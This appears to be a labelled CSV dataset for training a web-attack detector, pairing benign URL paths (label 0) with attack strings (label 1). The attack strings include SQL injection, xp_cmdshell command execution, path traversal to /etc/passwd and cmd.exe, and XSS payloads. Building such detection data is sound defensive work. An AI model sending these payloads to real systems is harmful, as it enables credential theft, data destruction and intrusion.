payload,label
/dashboard?id=1979,0
/contact?category=tech592,0
/contact?user=urmit813,0
/login?category=tech35,0
/products/item?sort=asc649,0
/checkout?id=1394,0
/checkout,0
/index.html?user=urmit793,0
"/UNION SELECT username, password FROM users",1
/api/users?id=1969,0
/login?category=tech237,0
/login?user=urmit736,0
/products/item?sort=asc594,0
/index.html?category=tech835,0
/admin' --,1
/contact?sort=asc775,0
/login?sort=asc961,0
/contact?id=1112,0
/<script>alert(document.cookie)</script>,1
/index.html?user=urmit494,0
/contact?page=2815,0
/contact?page=2794,0
/contact?sort=asc531,0
/index.html?user=urmit468,0
"/contact?search="" OR 1=1 --",1
/api/users?id=1695,0
/api/users,0
/dashboard?id=153,0
/contact?category=tech712,0
/index.html?id=174,0
/contact?page=2780,0
/about?user=urmit282,0
/login?user=urmit519,0
/index.html?search=../../../windows/system32/cmd.exe,1
/about?user=urmit869,0
/about?user=urmit495,0
/api/users?user=urmit976,0
/products/item?id=1290,0
/products/item?category=tech922,0
/about?category=tech895,0
/index.html?sort=asc548,0
/dashboard?page=2445,0
/dashboard?user=urmit683,0
/products/item?category=tech522,0
/api/users?sort=asc542,0
/checkout?category=tech814,0
/login,0
/dashboard?sort=asc975,0
/products/item?search=javascript:eval('var a=1'),1
/dashboard?page=2419,0
/contact?user=urmit224,0
/about,0
/onload=prompt(1),1
/about?category=tech786,0
/about?search=../../../windows/system32/cmd.exe,1
/contact?user=urmit175,0
/index.html?user=urmit694,0
/login?user=urmit704,0
/login?category=tech43,0
/login,0
/about?category=tech852,0
/products/item?id=1575,0
/dashboard,0
/products/item?category=tech563,0
/index.html?category=tech606,0
/products/item?search=../../../windows/system32/cmd.exe,1
/checkout?page=2817,0
/dashboard?sort=asc499,0
/login?search=../../../windows/system32/cmd.exe,1
/products/item?page=2320,0
/api/users?page=266,0
/dashboard?category=tech264,0
"/UNION SELECT username, password FROM users",1
/about?search=javascript:eval('var a=1'),1
/dashboard?search=../../../windows/system32/cmd.exe,1
/login,0
/checkout?category=tech984,0
/login?id=1941,0
/' OR '1'='1,1
/api/users,0
/checkout?user=urmit727,0
/api/users?user=urmit90,0
/api/users,0
/api/users?category=tech534,0
/index.html?category=tech163,0
/../../../windows/system32/cmd.exe,1
/products/item?search=../../../../etc/passwd,1
/products/item?page=2616,0
/admin' --,1
/api/users?category=tech36,0
/about?page=2836,0
/api/users?user=urmit764,0
/api/users?page=2690,0
/checkout?category=tech100,0
/products/item,0
/products/item?sort=asc116,0
/dashboard?category=tech921,0
/dashboard?id=1163,0
/dashboard?page=2774,0
/contact?user=urmit261,0
"/"" OR 1=1 --",1
/checkout?category=tech582,0
/products/item?id=1398,0
/javascript:eval('var a=1'),1
/login?sort=asc383,0
/products/item,0
/api/users?id=1130,0
/login?user=urmit822,0
/dashboard?page=2632,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/'; EXEC xp_cmdshell('dir');--,1
/dashboard?sort=asc912,0
/products/item?category=tech251,0
/?id=1; DROP TABLE users,1
/about?user=urmit737,0
/about,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?id=1304,0
/products/item?page=27,0
/products/item?user=urmit911,0
/dashboard?sort=asc96,0
/dashboard?page=2146,0
/api/users?user=urmit361,0
/api/users?page=2119,0
/api/users?id=1489,0
/dashboard?sort=asc668,0
/dashboard,0
/checkout?user=urmit205,0
/about,0
/index.html?id=1514,0
/api/users,0
/about?user=urmit855,0
/dashboard?user=urmit269,0
/login?sort=asc801,0
"/"" OR 1=1 --",1
/about?category=tech426,0
"/api/users?search=UNION SELECT username, password FROM users",1
/about?page=2626,0
/about?id=1942,0
/index.html?category=tech741,0
/login,0
/contact?user=urmit595,0
/dashboard,0
/index.html?page=2680,0
/api/users?user=urmit877,0
/login?category=tech790,0
/api/users?page=2238,0
/checkout?category=tech611,0
/dashboard,0
/checkout?user=urmit722,0
/products/item,0
/products/item?page=2555,0
/index.html?user=urmit826,0
/dashboard?category=tech456,0
/products/item?page=2514,0
/api/users?user=urmit331,0
/dashboard?page=2971,0
/api/users?search=javascript:eval('var a=1'),1
/api/users?sort=asc677,0
/checkout?category=tech700,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/index.html?sort=asc471,0
/checkout?category=tech348,0
/checkout?category=tech391,0
/products/item?id=1784,0
/about?search=' OR '1'='1,1
/dashboard?user=urmit371,0
/about?id=1474,0
/products/item?sort=asc582,0
/contact?page=2837,0
/checkout?user=urmit709,0
/about?id=1372,0
/dashboard?user=urmit969,0
/contact?user=urmit499,0
/index.html?user=urmit145,0
/dashboard?page=221,0
/checkout?id=1136,0
/about?page=2394,0
/api/users?sort=asc805,0
/api/users,0
/products/item?sort=asc975,0
/checkout?user=urmit125,0
/about?category=tech608,0
/api/users?page=2494,0
/<script>alert(document.cookie)</script>,1
/contact,0
/admin' --,1
/index.html?search=<script>alert(document.cookie)</script>,1
/dashboard?category=tech267,0
/api/users,0
/checkout?category=tech953,0
/login?page=2909,0
/products/item?category=tech147,0
/login?user=urmit366,0
/checkout?id=1415,0
/login,0
/contact?page=2577,0
/about?category=tech547,0
/index.html?user=urmit887,0
/login?page=2149,0
/index.html?page=2603,0
/products/item?category=tech47,0
/index.html?search=?id=1; DROP TABLE users,1
/dashboard?category=tech10,0
/dashboard,0
/login,0
/'; EXEC xp_cmdshell('dir');--,1
/about?sort=asc181,0
/contact?id=1122,0
/products/item?sort=asc65,0
/products/item?category=tech621,0
/login,0
/index.html?category=tech536,0
/api/users?sort=asc323,0
/login?id=1124,0
/checkout?sort=asc107,0
/login?user=urmit730,0
/<script>alert(document.cookie)</script>,1
/dashboard?category=tech127,0
/login?user=urmit638,0
/api/users,0
/index.html?category=tech939,0
/about?search=javascript:eval('var a=1'),1
/login?page=2531,0
/checkout?user=urmit555,0
/about?category=tech287,0
"/"" OR 1=1 --",1
/index.html?sort=asc382,0
/about?id=1406,0
/api/users?category=tech838,0
/about?page=2180,0
/contact?sort=asc309,0
/about,0
/checkout?category=tech1,0
/login?id=1488,0
/contact?id=1663,0
/api/users?sort=asc807,0
/index.html,0
/javascript:eval('var a=1'),1
/login?category=tech984,0
/dashboard?page=2877,0
/contact?search=../../../windows/system32/cmd.exe,1
/index.html?page=2569,0
/api/users,0
/products/item?search=../../../../etc/passwd,1
/login?sort=asc32,0
/products/item?page=2405,0
/dashboard?sort=asc671,0
/api/users?sort=asc666,0
/contact?user=urmit15,0
/dashboard,0
/checkout?search=../../../windows/system32/cmd.exe,1
"/contact?search=UNION SELECT username, password FROM users",1
/javascript:eval('var a=1'),1
/index.html,0
/checkout?category=tech573,0
/about?category=tech63,0
/../../../../etc/passwd,1
/index.html?sort=asc205,0
/products/item?page=2724,0
/index.html?user=urmit220,0
"/about?search="" OR 1=1 --",1
/api/users?id=1115,0
/about?category=tech809,0
/products/item?category=tech781,0
/api/users?id=1274,0
/login?id=1999,0
/contact?user=urmit499,0
/dashboard?category=tech628,0
/checkout?sort=asc294,0
/products/item?category=tech811,0
/'; EXEC xp_cmdshell('dir');--,1
/dashboard?sort=asc427,0
/api/users?id=1308,0
/index.html,0
/api/users?id=11,0
/dashboard?page=2543,0
/products/item?page=2416,0
/dashboard?sort=asc998,0
/<script>alert(document.cookie)</script>,1
/products/item,0
/api/users?sort=asc545,0
/index.html?user=urmit647,0
/index.html?page=2391,0
/contact?id=1510,0
/about?search=' OR '1'='1,1
/products/item?category=tech261,0
/products/item?id=1455,0
/dashboard,0
/<script>alert(document.cookie)</script>,1
/about,0
/checkout?page=2923,0
/?id=1; DROP TABLE users,1
/index.html?user=urmit884,0
/products/item?page=2128,0
/login?page=2965,0
/?id=1; DROP TABLE users,1
/index.html?category=tech800,0
/products/item?id=1818,0
/about,0
/<script>alert(document.cookie)</script>,1
/api/users?search='; EXEC xp_cmdshell('dir');--,1
/login?sort=asc310,0
/dashboard?sort=asc770,0
/about?user=urmit350,0
/dashboard?category=tech796,0
/api/users?page=2670,0
/api/users?id=1864,0
/dashboard?category=tech592,0
/about?category=tech588,0
/about,0
/?id=1; DROP TABLE users,1
/login?id=1153,0
/dashboard,0
/index.html?sort=asc475,0
/contact?page=2341,0
/about,0
/login?user=urmit650,0
"/UNION SELECT username, password FROM users",1
/admin' --,1
/../../../../etc/passwd,1
/products/item?search=' OR '1'='1,1
/login?id=1360,0
/checkout?sort=asc233,0
/login?sort=asc271,0
/about?sort=asc600,0
/?id=1; DROP TABLE users,1
/api/users?page=2120,0
/about?search=' OR '1'='1,1
/index.html?page=2549,0
/../../../windows/system32/cmd.exe,1
"/UNION SELECT username, password FROM users",1
/api/users?sort=asc635,0
/about?category=tech571,0
/login?sort=asc679,0
"/index.html?search="" OR 1=1 --",1
/about?user=urmit926,0
/dashboard?user=urmit258,0
/login?id=1780,0
/products/item?sort=asc681,0
/about?sort=asc132,0
/contact?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?search=../../../../etc/passwd,1
/about?id=1461,0
/index.html?sort=asc134,0
/api/users?sort=asc606,0
/products/item?id=1947,0
/about?user=urmit622,0
/<script>alert(document.cookie)</script>,1
/about?user=urmit495,0
/checkout?page=2231,0
/login?user=urmit773,0
/../../../windows/system32/cmd.exe,1
/checkout,0
/index.html?user=urmit618,0
/api/users?user=urmit431,0
/api/users?category=tech500,0
/dashboard?id=1181,0
"/dashboard?search=UNION SELECT username, password FROM users",1
/contact?user=urmit937,0
/products/item?sort=asc611,0
/products/item?sort=asc845,0
/products/item?user=urmit853,0
/login?page=2704,0
/api/users?category=tech626,0
/api/users?user=urmit509,0
/dashboard?user=urmit750,0
/admin' --,1
/products/item,0
/login,0
/dashboard?page=219,0
/contact?id=1830,0
/index.html?category=tech1,0
/checkout?category=tech739,0
/dashboard?user=urmit403,0
/api/users?search='; EXEC xp_cmdshell('dir');--,1
"/"" OR 1=1 --",1
/dashboard,0
/checkout,0
/api/users?search='; EXEC xp_cmdshell('dir');--,1
/about?page=2454,0
/index.html?sort=asc221,0
/login?page=2779,0
/login?category=tech782,0
/index.html?page=2123,0
/api/users?sort=asc517,0
/index.html?id=1433,0
/contact?id=1641,0
/contact?user=urmit610,0
/checkout?sort=asc783,0
/about?id=1437,0
/login?page=2314,0
/api/users,0
/login?sort=asc507,0
/login?page=2651,0
/login?search=?id=1; DROP TABLE users,1
/dashboard?page=2726,0
/products/item?search=?id=1; DROP TABLE users,1
/login?page=2783,0
/contact?sort=asc463,0
/index.html?search=javascript:eval('var a=1'),1
/products/item?search=../../../../etc/passwd,1
/' OR '1'='1,1
/api/users?user=urmit557,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/api/users?id=1165,0
/checkout?sort=asc694,0
/index.html?user=urmit499,0
/api/users?search=../../../windows/system32/cmd.exe,1
/dashboard?user=urmit735,0
/index.html,0
/checkout?page=2162,0
/about?search=../../../../etc/passwd,1
/login?id=1336,0
/dashboard?sort=asc247,0
/<script>alert(document.cookie)</script>,1
/about?search=javascript:eval('var a=1'),1
/dashboard?sort=asc679,0
/login,0
/checkout?category=tech541,0
/contact?search=../../../../etc/passwd,1
/api/users?page=2923,0
/contact,0
/index.html?sort=asc667,0
/?id=1; DROP TABLE users,1
/products/item,0
/checkout?category=tech725,0
/index.html?search=javascript:eval('var a=1'),1
/products/item?search=admin' --,1
/login?search=admin' --,1
/login?search=admin' --,1
/about?user=urmit569,0
/dashboard?category=tech496,0
/admin' --,1
/login?user=urmit669,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/index.html,0
/about?category=tech405,0
/index.html?sort=asc776,0
/dashboard?sort=asc11,0
/checkout?user=urmit896,0
/index.html?search=../../../windows/system32/cmd.exe,1
/onload=prompt(1),1
/index.html,0
/contact?search=javascript:eval('var a=1'),1
/products/item?id=1426,0
/checkout?page=2108,0
/about?category=tech459,0
/contact?sort=asc674,0
/index.html?sort=asc428,0
/index.html?user=urmit475,0
/login?category=tech369,0
/products/item?id=1342,0
/api/users?category=tech511,0
/login?sort=asc420,0
/dashboard?search='; EXEC xp_cmdshell('dir');--,1
/contact?page=2752,0
/products/item?sort=asc333,0
/api/users?user=urmit71,0
/contact?id=1973,0
/'; EXEC xp_cmdshell('dir');--,1
/index.html?category=tech212,0
/about?sort=asc476,0
/api/users?user=urmit351,0
/dashboard?user=urmit977,0
/products/item?sort=asc218,0
/checkout?category=tech804,0
/dashboard?page=2677,0
/login?search=' OR '1'='1,1
/?id=1; DROP TABLE users,1
/api/users?search=../../../windows/system32/cmd.exe,1
/checkout?page=2408,0
/<script>alert(document.cookie)</script>,1
/../../../windows/system32/cmd.exe,1
/?id=1; DROP TABLE users,1
/api/users?search=../../../windows/system32/cmd.exe,1
/checkout?category=tech574,0
/about?id=1238,0
/about?id=128,0
/about,0
/checkout?search=../../../windows/system32/cmd.exe,1
/login?page=2409,0
/index.html?id=1701,0
/products/item?search=' OR '1'='1,1
/login?user=urmit110,0
/products/item?category=tech439,0
/about?user=urmit468,0
/login?search=onload=prompt(1),1
/checkout?page=2399,0
/contact,0
/products/item,0
/login?page=2602,0
/dashboard?id=1999,0
/index.html?id=1550,0
/products/item?user=urmit907,0
/api/users?search=<script>alert(document.cookie)</script>,1
/dashboard?user=urmit641,0
/login?user=urmit199,0
/login?id=1266,0
/dashboard?sort=asc376,0
/index.html?category=tech123,0
/contact?sort=asc442,0
/' OR '1'='1,1
/checkout?user=urmit694,0
/javascript:eval('var a=1'),1
/products/item,0
/contact?user=urmit112,0
/about?sort=asc656,0
/checkout?category=tech91,0
/contact?id=1581,0
/dashboard?id=1675,0
/products/item?page=2475,0
/login?id=1336,0
/admin' --,1
/contact?id=1978,0
/login?page=2868,0
/dashboard?search=../../../../etc/passwd,1
/?id=1; DROP TABLE users,1
/about?page=2974,0
/index.html?search=<script>alert(document.cookie)</script>,1
/index.html?sort=asc873,0
/contact?search=?id=1; DROP TABLE users,1
/about?user=urmit691,0
/' OR '1'='1,1
/api/users?search=../../../../etc/passwd,1
/login?id=1831,0
/checkout?page=2960,0
/dashboard?id=1163,0
/<script>alert(document.cookie)</script>,1
/' OR '1'='1,1
/products/item?sort=asc945,0
/contact,0
/login?user=urmit186,0
/products/item?search=admin' --,1
/about?category=tech19,0
/products/item?id=1821,0
/contact?category=tech816,0
/about?sort=asc793,0
/<script>alert(document.cookie)</script>,1
/checkout,0
/login?category=tech610,0
/checkout?user=urmit541,0
/checkout?page=2195,0
/login,0
/index.html?user=urmit942,0
/about,0
/checkout,0
/about?category=tech622,0
/dashboard?sort=asc882,0
/products/item?user=urmit582,0
/../../../../etc/passwd,1
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about,0
/admin' --,1
/contact?page=2423,0
/index.html?id=1346,0
/dashboard?page=2299,0
/'; EXEC xp_cmdshell('dir');--,1
/products/item?id=1302,0
/dashboard,0
/api/users,0
/index.html?search='; EXEC xp_cmdshell('dir');--,1
/login?category=tech503,0
/'; EXEC xp_cmdshell('dir');--,1
/login?page=2139,0
/products/item?page=2274,0
/dashboard?user=urmit604,0
/checkout?user=urmit211,0
"/UNION SELECT username, password FROM users",1
/about?page=2769,0
/dashboard?sort=asc689,0
/contact?page=2654,0
/index.html?search=<script>alert(document.cookie)</script>,1
/about?sort=asc804,0
/index.html,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/about?id=1166,0
/checkout?sort=asc709,0
/products/item?page=2161,0
/dashboard?page=2545,0
"/api/users?search=UNION SELECT username, password FROM users",1
/about,0
/dashboard?user=urmit228,0
/about?sort=asc309,0
/login?user=urmit544,0
/checkout?search=?id=1; DROP TABLE users,1
/api/users?category=tech356,0
/contact,0
/api/users,0
"/login?search=UNION SELECT username, password FROM users",1
/onload=prompt(1),1
/index.html?search=../../../windows/system32/cmd.exe,1
/api/users?id=160,0
/api/users?page=2261,0
/contact?id=1995,0
/contact,0
/contact?user=urmit548,0
/dashboard?category=tech605,0
/login,0
/login?user=urmit984,0
/../../../../etc/passwd,1
/login,0
/index.html,0
/api/users?user=urmit843,0
/api/users?page=2493,0
/products/item?id=1558,0
/about?sort=asc504,0
/index.html?category=tech919,0
/login?page=2410,0
/login?sort=asc517,0
/login?user=urmit265,0
/dashboard?sort=asc115,0
/products/item,0
/products/item?user=urmit77,0
/login?user=urmit258,0
/checkout?category=tech112,0
/about,0
/api/users?id=1854,0
/checkout,0
/index.html?user=urmit133,0
/index.html?user=urmit475,0
/dashboard?page=2794,0
/contact?category=tech355,0
/api/users?page=2149,0
/products/item?id=1808,0
/products/item?search=onload=prompt(1),1
/index.html?id=1300,0
/contact?category=tech225,0
/api/users?id=1992,0
/checkout?category=tech852,0
/checkout,0
/products/item?id=1689,0
/../../../../etc/passwd,1
/'; EXEC xp_cmdshell('dir');--,1
/index.html?page=2327,0
/index.html?category=tech253,0
/login?id=120,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?page=2427,0
/api/users?id=1444,0
/contact?category=tech167,0
/admin' --,1
/login?sort=asc55,0
/login?sort=asc321,0
/about?page=2340,0
/login,0
/admin' --,1
/api/users,0
"/UNION SELECT username, password FROM users",1
/dashboard?category=tech703,0
/index.html,0
/index.html?sort=asc757,0
/index.html?search=../../../windows/system32/cmd.exe,1
/products/item?page=2405,0
/index.html?user=urmit77,0
/products/item?page=2877,0
/dashboard?page=2773,0
/about?id=1918,0
/login?id=1952,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?user=urmit184,0
/products/item?sort=asc220,0
/checkout?id=1614,0
/about?category=tech951,0
/index.html,0
/about?search=<script>alert(document.cookie)</script>,1
/api/users?category=tech224,0
/products/item?id=1521,0
/contact?sort=asc118,0
/dashboard?page=2843,0
/<script>alert(document.cookie)</script>,1
/index.html,0
/contact?sort=asc729,0
/' OR '1'='1,1
/about,0
/about,0
/index.html?category=tech123,0
/api/users?sort=asc412,0
/index.html?sort=asc751,0
/about?search=../../../windows/system32/cmd.exe,1
/checkout?page=2306,0
/admin' --,1
/api/users?sort=asc454,0
/about?sort=asc192,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/api/users?page=2500,0
/api/users?category=tech140,0
/dashboard,0
/contact?category=tech550,0
/checkout?user=urmit332,0
/products/item?user=urmit73,0
/login?id=182,0
/api/users?page=2932,0
/about?id=1939,0
"/dashboard?search="" OR 1=1 --",1
/contact?id=1736,0
/api/users,0
/products/item,0
/api/users,0
/login,0
/api/users,0
/' OR '1'='1,1
/index.html,0
/about,0
/dashboard?id=1170,0
/checkout?page=2729,0
/api/users?search=admin' --,1
/about?page=270,0
/api/users?user=urmit721,0
/contact?category=tech868,0
/about,0
/about?category=tech160,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/login?sort=asc946,0
/about?page=2617,0
/login?search=javascript:eval('var a=1'),1
/dashboard,0
/login?search=admin' --,1
/about?sort=asc719,0
/products/item?search=../../../../etc/passwd,1
/login?user=urmit937,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/dashboard?user=urmit232,0
/../../../windows/system32/cmd.exe,1
/about?user=urmit358,0
/api/users?search=../../../windows/system32/cmd.exe,1
/checkout,0
/login?sort=asc74,0
/contact?id=1277,0
/index.html?sort=asc249,0
/api/users?page=2851,0
/contact,0
/checkout?user=urmit498,0
"/UNION SELECT username, password FROM users",1
/login?sort=asc980,0
/login?category=tech465,0
/checkout?id=1214,0
/about?user=urmit395,0
/contact?id=1926,0
"/"" OR 1=1 --",1
/about?page=2100,0
"/dashboard?search="" OR 1=1 --",1
/about?search=<script>alert(document.cookie)</script>,1
/api/users?page=2197,0
/checkout?sort=asc821,0
/checkout?category=tech511,0
/login?sort=asc272,0
/index.html,0
/products/item?user=urmit805,0
/dashboard?sort=asc866,0
/about?sort=asc451,0
/about?page=2181,0
/index.html?search=../../../windows/system32/cmd.exe,1
/login?page=2255,0
/login?sort=asc478,0
/api/users,0
/login?id=1610,0
/index.html?category=tech222,0
/api/users?sort=asc611,0
/contact?id=1202,0
/dashboard?sort=asc42,0
/contact?user=urmit758,0
/index.html?user=urmit23,0
/products/item?user=urmit207,0
/products/item,0
/contact,0
/api/users?user=urmit426,0
/api/users?user=urmit242,0
/products/item?id=1651,0
/' OR '1'='1,1
/dashboard?user=urmit381,0
/checkout?user=urmit765,0
"/UNION SELECT username, password FROM users",1
/products/item?id=1761,0
/api/users?user=urmit621,0
"/UNION SELECT username, password FROM users",1
/contact?search=javascript:eval('var a=1'),1
/api/users?sort=asc650,0
/products/item?category=tech107,0
/dashboard?category=tech294,0
/about,0
/login?category=tech852,0
/contact?user=urmit857,0
/checkout?category=tech598,0
/login?sort=asc19,0
/products/item?category=tech567,0
/checkout?page=2584,0
/checkout?sort=asc498,0
/index.html?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/checkout?sort=asc181,0
/dashboard?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/login?sort=asc591,0
/' OR '1'='1,1
/checkout?sort=asc700,0
/about?page=2500,0
/index.html?sort=asc152,0
/checkout?sort=asc579,0
/api/users?user=urmit33,0
/products/item?id=1903,0
/index.html?page=2928,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?search=javascript:eval('var a=1'),1
/contact?category=tech255,0
/index.html?category=tech152,0
/checkout,0
/index.html?user=urmit29,0
/index.html?sort=asc832,0
/checkout?page=2489,0
/?id=1; DROP TABLE users,1
/login?sort=asc495,0
/login?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/products/item?search=../../../../etc/passwd,1
/checkout?id=1689,0
/login?id=1811,0
/products/item?id=1979,0
/api/users?user=urmit3,0
/contact,0
/checkout?page=2162,0
/index.html?search=' OR '1'='1,1
/' OR '1'='1,1
/dashboard?id=1428,0
/api/users?sort=asc90,0
/login?category=tech574,0
/login?page=2457,0
/contact,0
/login?user=urmit913,0
/javascript:eval('var a=1'),1
/dashboard,0
/contact?search=../../../../etc/passwd,1
/dashboard?user=urmit108,0
/about?user=urmit66,0
/contact?sort=asc187,0
/index.html?user=urmit642,0
/checkout?sort=asc905,0
/login?category=tech241,0
/index.html?user=urmit564,0
/'; EXEC xp_cmdshell('dir');--,1
/checkout?category=tech744,0
/about?user=urmit548,0
/login?search=javascript:eval('var a=1'),1
/contact?category=tech889,0
/login?page=2320,0
/index.html,0
/contact?category=tech242,0
/about?category=tech627,0
/index.html?sort=asc402,0
/about?user=urmit295,0
/dashboard?id=1800,0
/login?user=urmit499,0
/products/item?search=../../../../etc/passwd,1
/login?page=2849,0
/api/users?id=1829,0
/dashboard,0
/dashboard?id=1727,0
/index.html?sort=asc599,0
"/"" OR 1=1 --",1
/about?sort=asc610,0
/products/item?sort=asc338,0
/login?id=153,0
/products/item?category=tech643,0
/checkout?sort=asc414,0
/login?page=2283,0
/?id=1; DROP TABLE users,1
/about?page=2241,0
/contact?search=<script>alert(document.cookie)</script>,1
/checkout?id=1226,0
/checkout?sort=asc59,0
/about?category=tech338,0
/products/item,0
/api/users?sort=asc381,0
/dashboard?user=urmit839,0
"/dashboard?search="" OR 1=1 --",1
"/UNION SELECT username, password FROM users",1
/contact?user=urmit459,0
/api/users?category=tech46,0
/api/users,0
/admin' --,1
/login?id=1829,0
/dashboard?category=tech983,0
/api/users,0
/dashboard?search=<script>alert(document.cookie)</script>,1
/login?category=tech681,0
/checkout?id=1780,0
/about,0
/contact?id=1639,0
/products/item?id=1813,0
/about?user=urmit590,0
/index.html,0
/login?sort=asc215,0
/dashboard?category=tech410,0
/contact,0
/login?category=tech771,0
/index.html?user=urmit412,0
/../../../windows/system32/cmd.exe,1
/index.html?id=1667,0
/checkout,0
/dashboard?category=tech616,0
/checkout?id=1499,0
/about?page=2557,0
/index.html?category=tech69,0
/api/users,0
/api/users,0
/onload=prompt(1),1
/contact?sort=asc965,0
/api/users?sort=asc91,0
/api/users?page=2527,0
/products/item?id=1899,0
/contact?page=2451,0
/products/item?page=233,0
/onload=prompt(1),1
/about?page=2345,0
/contact?sort=asc758,0
/about,0
/api/users,0
/checkout?category=tech418,0
/../../../windows/system32/cmd.exe,1
/products/item,0
/index.html?category=tech699,0
/../../../windows/system32/cmd.exe,1
/checkout,0
/products/item?user=urmit492,0
/contact?page=2967,0
/checkout?page=2947,0
/api/users?sort=asc873,0
/contact?sort=asc78,0
/dashboard,0
/products/item?category=tech65,0
/products/item?id=1536,0
/checkout?id=1362,0
/index.html?user=urmit486,0
/dashboard?user=urmit64,0
/dashboard?category=tech406,0
/login?sort=asc192,0
/checkout?category=tech149,0
/index.html?id=1364,0
/products/item?category=tech443,0
/?id=1; DROP TABLE users,1
/api/users?sort=asc391,0
/about?user=urmit307,0
/products/item?id=1869,0
/index.html?id=1471,0
/contact,0
/contact?sort=asc656,0
/api/users?sort=asc935,0
/checkout?id=1476,0
"/index.html?search="" OR 1=1 --",1
/onload=prompt(1),1
/checkout?id=1203,0
/index.html?sort=asc995,0
/index.html?user=urmit459,0
/dashboard,0
/products/item?page=2615,0
/api/users,0
/checkout?page=2845,0
/login?sort=asc217,0
/checkout?id=158,0
/api/users?page=2498,0
/admin' --,1
/index.html?category=tech60,0
/products/item,0
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1
/contact?category=tech607,0
/api/users?id=1410,0
/login?user=urmit445,0
/' OR '1'='1,1
/checkout,0
/login,0
/about,0
/contact?id=1752,0
/login?page=2925,0
/?id=1; DROP TABLE users,1
/login?user=urmit271,0
/about,0
/dashboard?page=2527,0
/<script>alert(document.cookie)</script>,1
/<script>alert(document.cookie)</script>,1
/about?category=tech102,0
/api/users?sort=asc845,0
/api/users?id=1964,0
/about?id=1441,0
/products/item?search=../../../../etc/passwd,1
/contact?category=tech126,0
/checkout,0
/login,0
/index.html?category=tech524,0
/about?category=tech346,0
/dashboard?category=tech73,0
/<script>alert(document.cookie)</script>,1
/products/item?category=tech183,0
/checkout?id=126,0
/checkout?sort=asc714,0
/products/item?search=' OR '1'='1,1
/' OR '1'='1,1
/javascript:eval('var a=1'),1
/contact?search='; EXEC xp_cmdshell('dir');--,1
/products/item?id=1722,0
/login,0
/dashboard?id=1885,0
/about?id=1480,0
/login?page=2768,0
/login?sort=asc668,0
/dashboard?id=1150,0
/api/users?page=2188,0
/login?id=1492,0
/products/item?user=urmit904,0
/login?page=2653,0
/login?page=282,0
/products/item?user=urmit879,0
/index.html?sort=asc666,0
/api/users?category=tech294,0
/api/users?id=1668,0
/onload=prompt(1),1
/?id=1; DROP TABLE users,1
/api/users,0
/dashboard?category=tech265,0
/checkout?user=urmit461,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1
/index.html?page=2633,0
/products/item?search=<script>alert(document.cookie)</script>,1
/login?search=<script>alert(document.cookie)</script>,1
/about?id=1708,0
/login?search=onload=prompt(1),1
/products/item?category=tech60,0
/index.html?user=urmit103,0
/contact?category=tech691,0
/contact?user=urmit722,0
/about?page=2868,0
/login?category=tech990,0
/contact?page=2627,0
/checkout?sort=asc300,0
/about?user=urmit57,0
"/UNION SELECT username, password FROM users",1
/../../../windows/system32/cmd.exe,1
/checkout?category=tech237,0
/api/users?search=javascript:eval('var a=1'),1
/dashboard?page=2458,0
/login?category=tech458,0
/dashboard?id=1301,0
/checkout?search=onload=prompt(1),1
/dashboard,0
/checkout,0
"/about?search=UNION SELECT username, password FROM users",1
/dashboard?page=2419,0
/products/item?sort=asc823,0
/api/users,0
/about?category=tech946,0
/contact?sort=asc454,0
/index.html?sort=asc276,0
/../../../windows/system32/cmd.exe,1
/api/users?category=tech205,0
/about,0
/dashboard?category=tech377,0
/about?category=tech542,0
/dashboard?category=tech719,0
/checkout?user=urmit370,0
/api/users,0
/login?user=urmit763,0
/contact?sort=asc999,0
